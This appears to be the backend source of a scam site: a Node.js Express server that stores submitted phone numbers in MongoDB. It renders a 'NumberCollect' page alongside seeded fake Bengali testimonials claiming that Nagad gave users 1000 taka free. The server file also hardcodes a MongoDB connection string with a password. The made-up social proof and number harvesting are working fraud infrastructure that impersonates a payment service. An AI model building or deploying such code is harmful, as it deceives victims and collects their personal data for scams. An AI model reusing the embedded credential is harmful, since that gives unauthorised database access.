const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));

// MongoDB Connection
mongoose.connect('mongodb+srv://MyDatabase:Cp8rNCfi15IUC6uc@cluster0.kjbloky.mongodb.net/numberDB', {
  useNewUrlParser: true,
  useUnifiedTopology: true
})
.then(() => console.log('MongoDB Connected'))
.catch(err => console.error('MongoDB Connection Error:', err));

// Mongoose Schema
const numberSchema = new mongoose.Schema({
  number: String,
  createdAt: { type: Date, default: Date.now }
});
const commentSchema = new mongoose.Schema({
  picture: {
    type: String,
    required: true
  },
  name: {
    type: String,
    required: true
  },
  comment: {
    type: String,
    required: true
  },
  time: {
    type: String,
    required: true
  },
  reactions: {
    type: String,
    required: true
  }
}, { timestamps: true });


const NumberModel = mongoose.model('Number', numberSchema);
const commentModel = mongoose.model('Comment', commentSchema);

// Route to store number
app.post('/number', async (req, res) => {
  const { number } = req.body;
  console.log(number);

  if (!number) {
    return res.status(400).json({ message: 'Number is required' });
  }

  try {
    // Check if number already exists
    const existingNumber = await NumberModel.findOne({ number });
    if (existingNumber) {
      return res.status(409).json({ message: 'Number already exists' });
    }

    const savedNumber = new NumberModel({ number });
    await savedNumber.save();
    res.status(201).json({ message: 'Number saved', data: savedNumber });
  } catch (error) {
    console.error('Error saving number:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Test route (optional)
app.get('/', async (req, res) => {
  
  const cardData = await commentModel.find({});
  res.render('NumberCollect', { cardData });
});


app.get('/comment', async (req, res) => {
  const cardData = [
    {
      picture: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPPoas6Rj7ffmUhnWER8THeBWhXugwXL_KxA&s",
      name: "Md Sobuj Hossain",
      comment: "আমি Nagad থেকে ১০০০ টাকা ফ্রী তে পেয়েছি। সত্যিই অসাধারণ!",
      time: "Just Now",
      reactions: "👍 3"
    },
    {
      picture: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSXkMpE45HeaPQkNCWRayOZjEc1WuTaHeBJwg&s",
      name: "Md Milon Khan",
      comment: "Nagad থেকে আজই আমি ১০০০ টাকা পেলাম। ধন্যবাদ Nagad!",
      time: "40 min",
      reactions: "👍 18"
    },
    {
      picture: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRcNsO2huwRv5NOdwLtELsch7jSyIh1peY7REBLLC_tN8X5GD3dyyz4RABB&s=10",
      name: "Shojib Ahmed",
      comment: "অবিশ্বাস্য মনে হলেও আমি Nagad থেকে টাকা পেয়েছি। সবাই ট্রাই করুন।",
      time: "2 hrs",
      reactions: "♥️😘 22"
    },
    {
      picture: "https://mir-s3-cdn-cf.behance.net/user/276/74ba9b1654506277.677e04dfd65cf.png",
      name: "Ashik Islam",
      comment: "এমন অফার আগে দেখি নাই! ধন্যবাদ Nagad।",
      time: "3 hrs",
      reactions: "♥️ 34"
    },
    {
      picture: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR1bF4-6dgISAbMinquVbT2wM3dHihRXJlpapZox5z83FAbszkoC3L-w7Vd&s=10",
      name: "Mis Anika Akter",
      comment: "Nagad থেকে ১০০০ টাকা ফ্রি পেয়ে খুবই খুশি।",
      time: "4 hrs",
      reactions: "😘♥️ 43"
    },
    {
      picture: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQQMTTKWHbTyyzamL-cIfbdezh5UdohgAiA-g&s",
      name: "সালমা আক্তার",
      comment: "আমি নিজেই পেয়েছি। এখন সবাইকে বলবো ট্রাই করতে।",
      time: "5 hrs",
      reactions: "👍♥️ 50"
    },
    {
      picture: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTvSqBb2ZzY3n5K7RznUC3CEedzP5EgLNSduQ&s",
      name: "Fatema Akter Rifa",
      comment: "অসাধারণ! ১০০০ টাকা পেয়েছি Nagad থেকে।",
      time: "7 hrs",
      reactions: "👍♥️ 120"
    },
    {
      picture: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTokGHEChibYjtYdCWpF60F4P8x32WhZerB5A&s",
      name: "Shakibal Hassan",
      comment: "এখনও যারা পায়নি, তারা দ্রুত ট্রাই করেন। সুযোগ মিস করবেন না।",
      time: "8 hrs",
      reactions: "👍♥️😘 219"
    },
    {
      picture: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQT08_1dF0iNLYfRnL2lbqnlXg5QKKofxDew&s",
      name: "Mamun Islan",
      comment: "সত্যিই কাজ করে! Nagad থেকে ফ্রী ১০০০ টাকা পেয়েছি।",
      time: "9 hrs",
      reactions: "👍♥️😘 319"
    }
];

  try {
    let inserted = [];

    for (const data of cardData) {
      const exists = await commentModel.findOne({ name: data.name, comment: data.comment });
      if (!exists) {
        const saved = await commentModel.create(data);
        inserted.push(saved);
      }
    }

    res.send({
      message: inserted.length > 0 ? 'New comments inserted' : 'No new comments to insert',
      data: inserted
    });

  } catch (error) {
    res.status(500).send({ error: 'Failed to insert comments', details: error.message });
  }
});
app.listen(PORT, () => {
  console.log(`Server running on http://127.0.0.1:${PORT}`);
});